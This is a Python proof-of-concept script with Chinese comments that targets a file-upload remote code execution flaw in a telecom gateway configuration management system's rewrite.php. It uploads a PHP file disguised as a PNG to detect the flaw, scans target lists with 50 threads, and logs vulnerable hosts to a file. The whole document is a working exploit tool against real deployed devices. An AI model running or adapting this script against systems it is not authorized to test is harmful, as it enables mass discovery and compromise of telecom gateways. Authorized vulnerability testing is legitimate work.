# 电信网关配置管理系统 rewrite.php 文件上传致RCE
import argparse,sys,requests,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
import time

#定义横幅


def banner():
    banner = """
██████╗ ██╗  ██╗██╗    ██╗ █████╗ ███╗   ██╗ ██████╗  ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗
██╔══██╗╚██╗██╔╝██║    ██║██╔══██╗████╗  ██║██╔════╝ ██╔════╝ ██║   ██║██╔══██╗████╗  ██║
██║  ██║ ╚███╔╝ ██║ █╗ ██║███████║██╔██╗ ██║██║  ███╗██║  ███╗██║   ██║███████║██╔██╗ ██║
██║  ██║ ██╔██╗ ██║███╗██║██╔══██║██║╚██╗██║██║   ██║██║   ██║██║   ██║██╔══██║██║╚██╗██║
██████╔╝██╔╝ ██╗╚███╔███╔╝██║  ██║██║ ╚████║╚██████╔╝╚██████╔╝╚██████╔╝██║  ██║██║ ╚████║
╚═════╝ ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
                                                                                                                                                                                                                                                                  
"""
    print(banner)


#定义主函数
def main():
    #调用横幅
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="电信网关配置管理系统 rewrite.php 文件上传致RCE")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    #如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    payload = '/manager/teletext/material/rewrite.php'
    url = target+payload
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0", "Connection": "keep-alive", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT"}
    data = "------WebKitFormBoundaryOKldnDPT\r\nContent-Disposition: form-data; name=\"tmp_name\"; filename=\"OSZZbp.php\"\r\nContent-Type: image/png\r\n\r\n<?php echo\"SAMCazoMDZjxVbnRwiatKxmAwuKafgqo\";unlink(__FILE__);?>\r\n------WebKitFormBoundaryOKldnDPT\r\nContent-Disposition: form-data; name=\"uploadtime\"\r\n\r\n\r\n------WebKitFormBoundaryOKldnDPT--\r\n"
    #请求网页
    # 上传后的url：/xmedia/material/OSZZbp.php
    try:
        res = requests.get(url=target,verify=False)
        if res.status_code == 200:
            res1 = requests.post(url=url,headers=headers,data=data,verify=False)
            print(res1.text)
            if res1.status_code == 200 and 'OSZZbp.php' in res1.text: 
                print(f'[+++]该{target}存在漏洞')
                with open('result.txt',mode='a',encoding='utf-8')as ft:
                    ft.write(target+'\n')
                return True
            else:
                print(f'该{target}不存在该漏洞')
            return False
    except:
        print(f'该{target}存在问题，请手动测试')
        return False


if __name__ == '__main__':
    main()
